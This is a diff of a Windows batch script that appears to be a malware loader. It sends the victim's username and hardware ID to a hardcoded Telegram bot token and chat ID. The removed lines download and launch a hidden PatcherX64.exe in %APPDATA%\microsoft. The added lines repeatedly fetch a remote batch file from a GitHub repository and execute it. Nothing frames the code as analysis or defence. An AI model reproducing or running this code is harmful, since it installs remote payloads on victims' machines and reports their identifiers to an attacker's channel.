@@ -39,13 +39,10 @@ for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemP
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGE=AgentConnected|RemcFileRunner|%USERNAME%|%HWID%|"
+set "MESSAGE=%USERNAME%|AgentConnected|%HWID%|RemcFileRunner|"
 
 
 
-
-:loop
-color 0A
 
 
 
@@ -82,63 +79,34 @@ goto :SENDMSG
 :INSTALLEVERY
 echo Performing installation or alternative actions...
 
-:: RunEveryInstaller
 
- 
-:loop
- 
-:: Kill & Delete file 
-taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
- 
-for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
- 
-:: Download the file using curl
-curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%"
- 
-timeout /t 2 /nobreak >nul
- 
-:: Checking the existing of the file
-if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
-    echo.
-    echo The download hasn't started yet. Please check your connection.
-	timeout /t 2 /nobreak >nul
-	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
-	echo.
-	goto loop
-)
- 
- 
- 
-:: Get the file size in bytes
-for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
- 
- 
- 
-:: Check if the file size is at least 400KB (400000 bytes)
-if %FILESIZE% geq 400000 (
-    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+
+
+
+
+set "embeddedScript=temp_script_RUNEVERYINSTALL.bat"
+
+:RUNEVERYINSTALL
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/RunEveryCaller"
+
+
+if exist "%embeddedScript%" (
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
 ) else (
-echo.
-    echo Download incomplete. Check your connection and run the file again.
-	timeout /t 2 /nobreak >nul
-	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
-	echo.
-	goto loop
+    echo Failed to get content from RUNEVERY Link
+    echo.
+    timeout /t 2 /nobreak >nul
+    goto RUNEVERYINSTALL
 )
- 
- 
-echo Patcher Running...
-timeout /t 1 /nobreak >nul
 
 
 
-set "MESSAGE=%MESSAGE%"
 
 
 
+set "MESSAGE=%MESSAGE%|RunEveryInstalled"
 
 
 
@@ -147,9 +115,6 @@ set "MESSAGE=%MESSAGE%"
 
 
 
-
-
-timeout /t 5 /nobreak >nul
 
 :SENDMSG
 
